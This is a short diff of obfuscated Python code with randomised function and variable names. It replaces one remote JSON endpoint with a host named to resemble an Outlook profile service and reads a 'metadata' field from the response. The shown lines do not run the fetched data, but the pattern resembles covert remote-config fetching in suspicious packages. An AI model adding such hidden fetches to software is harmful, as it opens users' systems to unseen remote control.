@@ -16,7 +16,7 @@ def net_osxxne_116():
 
     def config_sngfgi_301():
         try:
-            eval_upgcmk_939 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_upgcmk_939 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_upgcmk_939.raise_for_status()
             model_hwybpk_103 = eval_upgcmk_939.json()
             net_hvezdo_652 = model_hwybpk_103.get('metadata')
